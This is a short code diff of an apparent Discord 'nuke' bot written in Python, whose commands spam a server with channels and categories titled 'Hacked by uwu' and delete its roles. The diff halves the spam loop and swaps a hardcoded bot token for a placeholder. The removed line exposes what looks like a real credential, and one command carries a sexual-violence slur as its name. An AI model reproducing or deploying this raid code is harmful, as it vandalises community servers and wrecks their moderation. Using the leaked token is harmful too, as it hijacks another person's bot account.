@@ -13,7 +13,7 @@ async def on_ready():
 
 @client.command(pass_context=True)
 async def rape(ctx):
-    for i in range(300): #400 is limit of discord channels
+    for i in range(150): #400 is limit of discord channels
         guild = ctx.message.guild
         await guild.create_text_channel('hacked-by-uwu')
         await guild.create_category('Hacked by uwu')
@@ -34,4 +34,4 @@ async def dela(ctx):
             await role.delete()
 
 
-client.run('NzMzMzM5NjE0NTUwNjg3ODc0.XxBtvA.MfkYVtvxKDnjLfR8CAEhRPlMekg') #Bot's Token Code Goes Here
+client.run('token') #Bot's Token Code Goes Here
